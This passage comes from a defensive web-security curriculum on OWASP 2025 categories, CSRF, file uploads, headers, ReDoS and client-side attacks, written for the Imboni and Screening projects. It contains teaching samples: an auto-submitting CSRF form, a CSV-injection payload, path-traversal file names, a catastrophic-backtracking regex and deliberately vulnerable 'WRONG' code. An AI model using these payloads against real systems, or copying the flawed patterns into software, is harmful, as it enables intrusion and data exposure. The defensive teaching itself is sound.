        integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"
        crossorigin="anonymous"></script>
```

```bash
# Purpose: pin dependencies by hash so a compromised or re-published package
# cannot be substituted. pip refuses to install anything not matching.
pip install pip-tools
pip-compile --generate-hashes requirements.in -o requirements.txt
pip install --require-hashes -r requirements.txt
```

### Practice

1. Run the deserialisation grep. Replace every unsafe call.
2. Check your Celery serialiser settings in both projects.
3. Add SRI to every third-party script tag.
4. Generate a hash-pinned requirements file and install with `--require-hashes`.

---

## Chapter 9: A09 — Security Logging and Alerting Failures

Renamed from "Monitoring" to **"Alerting"**, which is the point: a log nobody reads is not
a control.

This is your weakest category. Per
`../00-foundations/01-SECURITY_FOUNDATIONS.md` Chapter 17, your audit completeness is 0%
and your September MTTD was about five days — with the detection coming from a third
party.

### What to log

```python
# Purpose: the security events that must be logged, as structured data. If an event
# is not here, you cannot investigate it later.
SECURITY_EVENTS = [
    "auth.login.success", "auth.login.failure", "auth.logout",
    "auth.password.changed", "auth.password.reset_requested",
    "auth.mfa.enrolled", "auth.mfa.removed", "auth.mfa.failed",
    "auth.recovery_code.used",
    "authz.denied",                       # every 403/404-for-authz
    "data.personal.read", "data.personal.exported", "data.personal.deleted",
    "admin.user.role_changed", "admin.impersonation.started",
    "config.changed",
    "integrity.csp_violation", "integrity.webhook.invalid_signature",
    "ratelimit.exceeded",
]
```

```python
# Purpose: structured security logging. JSON means it is queryable; the explicit
# field list means no accidental secrets.
import logging, json

sec = logging.getLogger("security")

def log_security(event: str, request=None, **fields):
    assert event in SECURITY_EVENTS, f"undeclared security event: {event}"
    payload = {
        "event": event,
        "at": timezone.now().isoformat(),
        "actor": getattr(getattr(request, "user", None), "pk", None),
        "ip": client_ip(request) if request else None,
        "path": getattr(request, "path", None),
        **fields,
    }
    sec.info(json.dumps(payload))
```

### What NOT to log

| Never log | Why |
|---|---|
| Passwords, even on failure | the log becomes a credential store |
| Session IDs, tokens, API keys | the log becomes a bypass |
| Full personal records | a second copy of the data you are protecting |
| Card numbers, national IDs | regulated data, now in a less-protected place |
| The contents of a mental-health response | the log is not the right place |

A logged credential is a real breach pattern: logs are copied to aggregators, shared with
support, and retained longer than the data they describe.

### Alerting — the part the rename is about

```python
# Purpose: alert on conditions that indicate an attack in progress, rather than
# reviewing logs after the fact. Each of these has a low false-positive rate.
ALERTS = {
    "auth.login.failure":  {"threshold": 20, "window": 300, "group_by": "ip"},
    "authz.denied":        {"threshold": 10, "window": 300, "group_by": "actor"},
    "data.personal.exported": {"threshold": 1, "window": 0, "group_by": None},
    "auth.mfa.removed":    {"threshold": 1, "window": 0, "group_by": None},
    "admin.user.role_changed": {"threshold": 1, "window": 0, "group_by": None},
    "integrity.webhook.invalid_signature": {"threshold": 5, "window": 300},
}
```

The rows with `threshold: 1` are the valuable ones. An export of personal data, an MFA
removal, or a role change should page a human **every single time**, because each is both
rare and exactly what an attacker does. Alert fatigue comes from alerting on common
events, not from alerting on rare ones.

```python
# Purpose: notice authorisation failures per user, which is the signature of an
# attacker probing for IDOR. A legitimate user triggers this approximately never.
def log_authz_denied(request, obj_type, obj_id):
    log_security("authz.denied", request, object_type=obj_type, object_id=obj_id)
    key = f"authz-denied:{request.user.pk}"
    n = cache.get(key, 0) + 1
    cache.set(key, n, 300)
    if n == 10:
        alert(f"User {request.user.email} hit 10 authorisation denials in 5 minutes "
              f"- probable IDOR probing")
```

### Practice

1. Implement structured security logging for all the declared events.
2. Audit your existing logs for anything in the "never log" table.
3. Implement the five `threshold: 1` alerts. Trigger each once and confirm it reaches you.
4. Implement the authorisation-denial counter. It will catch exercise 10 of the previous
   file running against you.
5. Answer: what is your MTTD today, and how would you know?

---

## Chapter 10: A10 — Mishandling of Exceptional Conditions

**New in 2025**, and the most conceptually interesting addition: what your system does
when something goes wrong is a security property.

### The four shapes

**1. Failing open.** An error path that grants access.

```python
# Purpose: WRONG. Any exception - a network blip, a parse error, a timeout -
# results in access being granted. This is the worst bug in the chapter.
def can_access(user, obj):
    try:
        return check_permission_service(user, obj)
    except Exception:
        return True                 # "do not break the user experience"

# Purpose: RIGHT. Fail closed on an authorisation decision, log it, and alert.
def can_access(user, obj) -> bool:
    try:
        return check_permission_service(user, obj)
    except Exception:
        logger.exception("permission service unavailable")
        log_security("authz.denied", reason="service_unavailable")
        return False                # fail-safe defaults
```

The judgement from the previous file's breached-password validator applies in reverse
here, and the rule is worth stating plainly:

> **Fail open on a quality check. Fail closed on an authorisation decision.**

**2. Leaking detail in errors.**

```python
# Purpose: WRONG. The error message tells an attacker what exists and why access
# failed, which is reconnaissance.
except Student.DoesNotExist:
    return JsonResponse({"error": f"No student with id {pk} in school {school_id}"}, status=404)
except PermissionDenied:
    return JsonResponse({"error": "You are not the guardian of this student"}, status=403)

# Purpose: RIGHT. One generic external message, full detail internally, correlated
# by an ID the user can quote to support.
import uuid

def handle(exc, request):
    ref = uuid.uuid4().hex[:12]
    logger.exception("request_failed", extra={"ref": ref, "path": request.path})
    return JsonResponse({"error": "Not found.", "reference": ref}, status=404)
```

**3. Inconsistent state after a partial failure.**

```python
# Purpose: WRONG. If the email fails, the guardianship is already created and the
# system is in a state no code path expects.
def add_guardian(student, email):
    g = Guardianship.objects.create(child=student, guardian=get_or_create(email))
    send_invitation(email)                   # raises → g exists, nobody was told
    AccessLog.objects.create(action="guardian_added", object_id=g.pk)

# Purpose: RIGHT. One transaction for the state change; side effects only after it
# commits, and retryable independently.
from django.db import transaction

def add_guardian(student, email):
    with transaction.atomic():
        g = Guardianship.objects.create(child=student, guardian=get_or_create(email))
        AccessLog.objects.create(action="guardian_added", object_id=g.pk)
        transaction.on_commit(lambda: send_invitation.delay(email))
```

`transaction.on_commit` is the correct pattern and it is widely missed: queue the task
only once the transaction has committed, or the worker can pick it up before the row is
visible and fail on a record that does not exist yet.

**4. Resource exhaustion on the error path.**

```python
# Purpose: WRONG. No timeout, so a slow or hostile external service holds a worker
# indefinitely. Enough of these and the application is down.
response = requests.get(url)

# Purpose: RIGHT. Explicit timeouts, bounded retries, a size limit, and a circuit
# breaker so a failing dependency does not take you with it.
response = requests.get(url, timeout=(3, 10))       # (connect, read)
```

```bash
# Purpose: find every request with no timeout. This is one of the highest-yield
# greps in this entire file.
grep -rn "requests.get(\|requests.post(\|urlopen(\|httpx.get(" --include="*.py" . \
  | grep -v timeout
```

### Practice

1. Run the timeout grep. Add explicit timeouts everywhere.
2. Find one authorisation path that fails open. Fix it and add a test that forces the
   exception and asserts denial.
3. Find one multi-step operation without a transaction. Wrap it and move side effects to
   `on_commit`.
4. Audit your error messages for anything that distinguishes "does not exist" from "not
   permitted".

---

# PART 2 — NOT ON THE LIST, STILL REAL

## Chapter 11: CSRF

No longer its own Top 10 category, because `SameSite` cookies made it uncommon by default.
Still exploitable when you step outside the defaults.

### The mechanism

```html
<!-- Purpose: a CSRF attack. The victim's browser attaches their session cookie
     automatically, so the request is authenticated even though the victim never
     intended it. -->
<form action="https://imboni.rw/api/guardians/add/" method="POST" id="f">
  <input name="email" value="attacker@evil.com">
  <input name="student_id" value="1247">
</form>
<script>document.getElementById("f").submit();</script>
```

### The defences, layered

| Defence | Strength |
|---|---|
| **`SameSite=Lax` cookies** | stops cross-site POST — the modern baseline |
| **Synchroniser token** | Django's `{% csrf_token %}`; strong, needs every form to use it |
| **Double-submit cookie** | weaker; a subdomain can set the cookie |
| **Origin / Referer check** | good secondary check |
| **Custom header on API calls** | requires CORS preflight, so cross-site is blocked |
| Re-authentication on sensitive actions | strongest, worst UX — use for the top few |

```python
# Purpose: the configuration that matters. Note CSRF_TRUSTED_ORIGINS is required
# for cross-origin frontends and is a frequent source of "CSRF failed" confusion.
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = "Lax"
CSRF_TRUSTED_ORIGINS = ["https://imboni.rw", "https://www.imboni.rw"]
CSRF_USE_SESSIONS = True            # store the token in the session, not a cookie
```

```bash
# Purpose: find CSRF exemptions. Each one is a deliberate hole and needs a reason
# written next to it - webhooks are the only common legitimate case, and those must
# verify an HMAC instead.
grep -rn "csrf_exempt\|@csrf_exempt\|CsrfViewMiddleware" --include="*.py" .
```

A `@csrf_exempt` on a webhook is correct *only if* the handler verifies an HMAC signature
(crypto Chapter 4). A `@csrf_exempt` with no signature verification is an unauthenticated
state-changing endpoint.

---

## Chapter 12: File upload

A concentrated collection of vulnerabilities, and both your projects accept uploads.

```python
# Purpose: WRONG. Trusts the client-supplied filename and content type, and stores
# the file inside the web root under a name the user controls.
def upload(request):
    f = request.FILES["file"]
    with open(f"/var/www/static/uploads/{f.name}", "wb") as out:
        out.write(f.read())
```

Every one of these is exploitable:

| Problem | Attack |
|---|---|
| Client filename trusted | `../../../etc/cron.d/x`, or `shell.php` |
| Content-Type trusted | it is a client-supplied string |
| Extension from the filename | `x.php.jpg`, `x.jpg.php`, `x.php%00.jpg` |
| Stored in the web root | upload a script, request it, code execution |
| No size limit | disk exhaustion |
| No content validation | a polyglot file that is both a valid image and a script |
| Served with the original type | stored XSS via an uploaded SVG or HTML |
| Image library on untrusted input | parser vulnerabilities (ImageTragick-style) |
| Archive extraction | zip-slip path traversal, or a zip bomb |

```python
# Purpose: RIGHT. Generate the name, verify the real content type by inspecting the
# bytes, enforce a size cap, re-encode images to strip anything embedded, and store
# outside the web root.
import secrets, magic
from PIL import Image
import io

ALLOWED = {"image/jpeg": ".jpg", "image/png": ".png", "application/pdf": ".pdf"}
MAX_BYTES = 5 * 1024 * 1024

def handle_upload(uploaded, owner) -> "Upload":
    if uploaded.size > MAX_BYTES:
        raise ValidationError("File too large (max 5 MB).")

    head = uploaded.read(2048)
    uploaded.seek(0)
    detected = magic.from_buffer(head, mime=True)     # real type, from the bytes
    if detected not in ALLOWED:
        raise ValidationError(f"File type not allowed: {detected}")

    # Generated name: no user-controlled component anywhere in the path.
    name = f"{secrets.token_urlsafe(16)}{ALLOWED[detected]}"
    path = UPLOAD_ROOT / name                        # OUTSIDE the web root

    if detected in ("image/jpeg", "image/png"):
        # Re-encode: strips EXIF, metadata, appended payloads and polyglot tricks.
        img = Image.open(uploaded)
        img.verify()                                 # structural check
        uploaded.seek(0)
        img = Image.open(uploaded)
        img = img.convert("RGB")
        if max(img.size) > 4000:
            raise ValidationError("Image dimensions too large.")
        img.save(path, format="JPEG" if detected == "image/jpeg" else "PNG",
                 optimize=True)
    else:
        with open(path, "wb") as out:
            for chunk in uploaded.chunks():
                out.write(chunk)

    return Upload.objects.create(owner=owner, stored_name=name,
                                 content_type=detected, size=uploaded.size)
```

```python
# Purpose: serve uploads through an authorised view with an explicit content type
# and Content-Disposition, so an uploaded file can never execute or render as HTML
# in your origin.
def serve_upload(request, pk):
    up = get_object_or_404(visible_uploads(request.user), pk=pk)
    response = FileResponse(open(UPLOAD_ROOT / up.stored_name, "rb"),
                            content_type=up.content_type)       # OUR value, not theirs
    response["Content-Disposition"] = f'attachment; filename="{up.safe_filename()}"'
    response["X-Content-Type-Options"] = "nosniff"
    response["Content-Security-Policy"] = "default-src 'none'; sandbox"
    return response
```

**EXIF stripping is a privacy requirement, not a nicety.** A photograph uploaded from a
phone carries GPS coordinates. For Imboni, that means a parent's photo of their child can
disclose their home address — and the re-encode above removes it. Serving uploads from a
separate origin (`uploads.imboni.rw`) is the further step, so that even a successful
stored XSS cannot reach your main origin's cookies.

---

## Chapter 13: Security headers reference

```nginx
# Purpose: the complete set, with the reason for each. Add to the server block.
add_header Strict-Transport-Security "max-age=63072000; includeSubDomains" always;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Cross-Origin-Opener-Policy "same-origin" always;
add_header Cross-Origin-Resource-Policy "same-origin" always;
add_header Permissions-Policy "geolocation=(), camera=(), microphone=(), payment=()" always;
add_header Content-Security-Policy "default-src 'none'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; font-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'none'" always;
server_tokens off;
```

| Header | Stops |
|---|---|
| `Strict-Transport-Security` | protocol downgrade, cookie theft over HTTP |
| `X-Content-Type-Options: nosniff` | an uploaded file being sniffed as HTML and executed |
| `X-Frame-Options` / `frame-ancestors` | clickjacking |
| `Referrer-Policy` | tokens and IDs leaking in `Referer` |
| `Cross-Origin-Opener-Policy` | cross-window attacks, enables process isolation |
| `Cross-Origin-Resource-Policy` | your resources being embedded cross-origin |
| `Permissions-Policy` | injected code requesting camera, microphone or location |
| `Content-Security-Policy` | **XSS execution, exfiltration, form retargeting** |

```bash
# Purpose: grade your headers from outside.
curl -sI https://imboni.rw | sort
# or: https://securityheaders.com/?q=imboni.rw
# or: https://observatory.mozilla.org/
```

`Permissions-Policy` deserves a note for Screening specifically: it has a camera feature
(`../../engineering-curriculum/07-case-studies/08-screening-camera.md`). Scope the camera
permission to the exact origin and route that needs it, so injected code elsewhere in the
application cannot request it.

---

## Chapter 14: Rate limiting and application DoS

Not only about volume. The cheap request that is expensive for you to serve.

| Vector | Example | Control |
|---|---|---|
| Expensive query | an unbounded date-range report | pagination, query timeout |
| Expensive computation | password hashing on the login endpoint | rate limit first |
| Amplification | one request fanning out to N queries | fix N+1; cap depth |
| Unbounded input | a 50 MB JSON body | `DATA_UPLOAD_MAX_MEMORY_SIZE` |
| Regex backtracking | **ReDoS** | avoid nested quantifiers; timeouts |
| Zip bomb | a 10 KB archive expanding to 10 GB | cap the extracted size |
| GraphQL nesting | a deeply recursive query | depth and complexity limits |

```python
# Purpose: ReDoS. This pattern backtracks catastrophically on a crafted input, so
# one request consumes CPU for minutes.
import re
re.match(r"^(a+)+$", "a" * 30 + "b")       # exponential time

# Purpose: RIGHT. Avoid nested quantifiers; validate structurally instead.
# For emails, use a validator, not a regex you wrote.
from django.core.validators import validate_email
```

```python
# Purpose: bound request size and database query time so a single request cannot
# consume the whole process.
DATA_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024
DATA_UPLOAD_MAX_NUMBER_FIELDS = 1000
FILE_UPLOAD_MAX_MEMORY_SIZE = 5 * 1024 * 1024

DATABASES = {"default": {
    ...,
    "OPTIONS": {"options": "-c statement_timeout=10000"},   # 10s, Postgres
}}
```

The `statement_timeout` is the single best protection against an accidental or deliberate
expensive query, and it costs one line.

---

## Chapter 15: Client-side attacks

| Attack | Mechanism | Defence |
|---|---|---|
| **Clickjacking** | your page in an invisible iframe over the attacker's | `frame-ancestors 'none'` |
| **Tabnabbing** | `target="_blank"` lets the opened page rewrite yours | `rel="noopener noreferrer"` |
| **postMessage abuse** | a listener that does not check `event.origin` | always verify the origin |
| **DOM clobbering** | injected HTML `id`s shadow JavaScript globals | avoid implicit global lookups |
| **Prototype pollution** | `__proto__` in merged user JSON affects every object | `Object.create(null)`, guard keys |

```javascript
// Purpose: WRONG. Accepts a message from any origin, so any site that can open a
// window to yours can drive this handler.
window.addEventListener("message", (e) => applyConfig(JSON.parse(e.data)));

// Purpose: RIGHT. Verify the origin before trusting anything in the message.
const TRUSTED = "https://imboni.rw";
window.addEventListener("message", (e) => {
  if (e.origin !== TRUSTED) return;
  applyConfig(JSON.parse(e.data));
});
```

```javascript
// Purpose: prototype pollution. A merge that walks user-controlled keys can write
// to Object.prototype, changing behaviour application-wide.
const BLOCKED = new Set(["__proto__", "constructor", "prototype"]);

function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    if (BLOCKED.has(key)) continue;
    target[key] = source[key];
  }
  return target;
}
```

---

## Chapter 16: Finding these yourself

```bash
# Purpose: static analysis for Python. bandit finds the obvious; semgrep finds
# patterns and supports custom rules.
pip install bandit semgrep
bandit -r . -ll -ii                         # medium+ severity, medium+ confidence
semgrep --config=p/security-audit --config=p/django --config=p/owasp-top-ten .

# Purpose: JavaScript and dependency analysis.
npm audit --audit-level=high
npx eslint --plugin security .

# Purpose: secret scanning, including history - a committed secret is in every clone.
pip install detect-secrets
detect-secrets scan --all-files > .secrets.baseline
docker run --rm -v "$(pwd):/repo" zricethezav/gitleaks:latest detect -s /repo -v

# Purpose: dynamic scanning of your OWN running application.
docker run --rm -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
  -t https://staging.imboni.rw -r report.html

# Purpose: dependency vulnerabilities with reachability where available.
pip install pip-audit && pip-audit --strict
osv-scanner --lockfile=requirements.txt
```

```python
# Purpose: a custom Semgrep rule for the bug class most specific to your codebase.
# Generic rulesets cannot know that unscoped queries are your main risk.
# .semgrep/unscoped-query.yml
rules:
  - id: unscoped-student-query
    pattern-either:
      - pattern: Student.objects.get(...)
      - pattern: Student.objects.filter(...)
      - pattern: get_object_or_404(Student, ...)
    message: >
      Query on Student without user scoping. Use visible_students(request.user)
      or Student.objects.for_user(request.user).
    languages: [python]
    severity: ERROR
    paths:
      exclude: ["*/tests/*", "*/migrations/*"]
```

That custom rule is worth more than every generic ruleset combined, because it encodes
*your* invariant. Generic tools find generic bugs; the bug that will hurt you is the one
specific to your design.

---

## Chapter 17: The catalogue

| # | Bug | Fix |
|---|---|---|
| 1 | `DEBUG = True` in production | `check --deploy` in CI |
| 2 | `ALLOWED_HOSTS = ["*"]` | exact hosts |
| 3 | No CSP, or CSP with `unsafe-inline` | nonce-based CSP |
| 4 | f-string into SQL | parameterised queries |
| 5 | `.extra()` / `RawSQL` with input | parameters, or the ORM |
| 6 | `order_by` or `filter` with a user-supplied field name | an allow-list map |
| 7 | `shell=True` | argument list |
| 8 | `dangerouslySetInnerHTML` with user content | DOMPurify with an allow-list |
| 9 | HTML-escaping inside `<script>` | `json_script` |
| 10 | `javascript:` reaching an `href` | validate the scheme |
| 11 | Template built from user input | user data as context |
| 12 | CSV export without prefix escaping | prefix `'` on `= + - @` |
| 13 | `pickle.loads` on untrusted data | JSON |
| 14 | Celery with the pickle serialiser | `accept_content = ["json"]` |
| 15 | Third-party script with no SRI | `integrity=` |
| 16 | Authorisation that fails open | fail closed, log, alert |
| 17 | Error messages distinguishing 403 from 404 | one generic message |
| 18 | Multi-step write with no transaction | `atomic` + `on_commit` |
| 19 | `requests.get` with no timeout | explicit `(connect, read)` |
| 20 | Client filename used as a storage path | generated name |
| 21 | Content type trusted from the client | detect from the bytes |
| 22 | Uploads inside the web root | outside, served by an authorised view |
| 23 | Images stored without re-encoding | re-encode; strips EXIF and polyglots |
| 24 | `@csrf_exempt` with no HMAC | verify the signature |
| 25 | `target="_blank"` without `rel` | `noopener noreferrer` |
| 26 | `postMessage` listener with no origin check | verify `event.origin` |
| 27 | Nested quantifiers in a regex on user input | restructure; add a timeout |
| 28 | No `statement_timeout` | set it |
| 29 | Personal data pages cacheable | `no-store` |
| 30 | No alert on personal-data export | `threshold: 1` alert |

## Chapter 18: The checklist

**Configuration**
- [ ] `check --deploy --fail-level WARNING` passes in CI
- [ ] `DEBUG = False`, verified by the 404 test
- [ ] Nonce-based CSP enforced, violations collected
- [ ] All eight security headers set
- [ ] `.env` and `.git/config` return 404
- [ ] Admin not reachable from the open internet

**Injection**
- [ ] Every raw SQL site reviewed; all parameterised
- [ ] No user input in a field name, `order_by` or template
- [ ] No `shell=True`
- [ ] Every `dangerouslySetInnerHTML` sanitised or removed
- [ ] `json_script` for data passed into JavaScript
- [ ] URL schemes validated before rendering
- [ ] CSV exports prefix-escaped
- [ ] `sqlmap` run against staging with no findings

**Integrity**
- [ ] No `pickle` or `yaml.load` on untrusted input
- [ ] Celery JSON-only
- [ ] SRI on third-party scripts
- [ ] Hash-pinned dependencies

**Exceptional conditions**
- [ ] No authorisation path fails open, with a test proving it
- [ ] Generic external errors with an internal reference ID
- [ ] Multi-step writes transactional, side effects on commit
- [ ] Every outbound request has a timeout
- [ ] `statement_timeout` set

**Uploads**
- [ ] Generated filenames, content type from bytes, size capped
- [ ] Stored outside the web root, served by an authorised view
- [ ] Images re-encoded (EXIF stripped)
- [ ] `nosniff` and `Content-Disposition: attachment`

**Logging**
- [ ] Every declared security event logged, structured
- [ ] No secrets or full records in logs
- [ ] `threshold: 1` alerts reaching a human
- [ ] Authorisation-denial counter alerting on probing

---

## Exercise 5 — the module checkpoint

Guide closed. No AI. Each produces an artefact — and for every vulnerability you claim to
find, produce the **request that proves it** and then the fix and the test.

1. **The 2025 list, from memory.** All ten, in order, with the two new ones and the one
   that was merged away. Then check it.

2. **Configuration audit.** `check --deploy --fail-level WARNING`, the `DEBUG` 404 test,
   and all five `curl` checks on both projects. Fix everything. Add it to CI. (Chapter 2)

3. **CSP, properly.** Deploy report-only, collect violations for a week, fix your own,
   then enforce with a nonce. Report how many inline scripts you had to change.
   (Chapter 2)

4. **Injection sweep.** Run every grep in Chapter 5. Review each hit by hand. Then run
   `sqlmap` against staging and report what it found. (Chapter 5)

5. **Second-order hunt.** Find one field stored safely and later used unsafely — in a raw
   query, an export, a report, or a log. This is the one scanners miss. (Chapter 5)

6. **XSS, all three kinds.** Find or construct one of each in a scratch application.
   Demonstrate CSP blocking the first. Then audit both real projects with the React grep.
   (Chapter 5)

7. **CSV injection.** Export a real CSV containing `=cmd|' /c calc'!A1` as a student name.
   Open it. Then fix it and re-export. (Chapter 5)

8. **Business logic.** Test all seven abuse patterns against Imboni. Report which worked.
   Replace one `if`-chain with a state machine plus optimistic concurrency. (Chapter 6)

9. **Deserialisation and integrity.** Run the grep, check Celery serialisers in both
   projects, add SRI, generate a hash-pinned requirements file. (Chapter 8)

10. **Logging and alerting.** Implement structured security logging, the five
    `threshold: 1` alerts, and the authorisation-denial counter. Trigger each and confirm
    it reaches you. (Chapter 9)

11. **Exceptional conditions.** Run the timeout grep and fix every hit. Find one
    fail-open authorisation path and write the test that forces the exception and asserts
    denial. (Chapter 10)

12. **Upload hardening.** Rebuild one upload path with all seven controls. Then upload a
    photograph with GPS EXIF and prove the stored file has none. (Chapter 12)

13. **Headers.** Get an A on securityheaders.com for both domains. (Chapter 13)

14. **Your own Semgrep rule.** Write the unscoped-query rule for your schema, run it, and
    add it to CI. Report how many violations it found. (Chapter 16)

15. **The catalogue.** All thirty rows against both projects, with file and line for every
    hit.

**Automatic fail:** claiming a vulnerability without the request that proves it; a CSP
containing `unsafe-inline` on `script-src`; any authorisation path that returns `True` in
an `except` block.

Exercise 5 is the one that finds a real bug in your code, because second-order injection
is invisible to every tool you will run. Exercise 7 takes four minutes and the result will
surprise you.
